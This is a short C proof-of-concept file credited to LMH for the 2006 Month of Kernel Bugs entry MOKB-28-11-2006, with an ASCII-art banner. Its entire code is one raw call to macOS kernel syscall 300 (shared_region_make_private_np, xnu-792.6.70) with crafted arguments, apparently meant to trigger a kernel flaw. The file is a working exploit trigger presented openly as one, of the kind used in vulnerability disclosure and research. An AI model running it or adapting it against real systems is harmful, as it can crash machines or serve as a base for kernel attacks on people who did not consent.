/*
 * Copyright 2006 (c) LMH <lmh@info-pull.com>.
 * All Rights Reserved.
 * ----           
 *               .---. .---. 
 *              :     : o   :    me want cookie and clues! L0W LEVA! - A 
J. H
 *          _..-:   o :     :-.._    / 
 *      .-''  '  `---' `---' "   ``-.    
 *    .'   "   '  "  .    "  . '  "  `. 
 *   :   '.---.,,.,...,.,.,.,..---.  ' ;
 *   `. " `.                     .' " .' kudos to ilja, kevin and icer.
 *    `.  '`.                   .' ' .'           "proof of concept" for
 *     `.    `-._           _.-' "  .'  .-------.       MOKB-28-11-2006.
 *       `. "    '"--...--"'  . ' .'  .'  · o   ·`.
 *       .'`-._'    " .     " _.-'`. :  C o C o A :
 *     .'      ```--.....--'''    ' `:_ o      o  :
 *   .'    "     '         "     "   ; `.;";";"; _'
 *  ;         '       "       '     . ; .' ; ; ;
 * ;     '         '       '   "    .'      .-'
 * '  "     "   '      "           "    _.-'
 */

#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>

int main() {
		/* shared_region_make_private_np = 300 (xnu-792.6.70), 
3rd arg unused */
        syscall(300, 0x8000000, 0xdeadface, 0xffffffff);
        return 0;
}
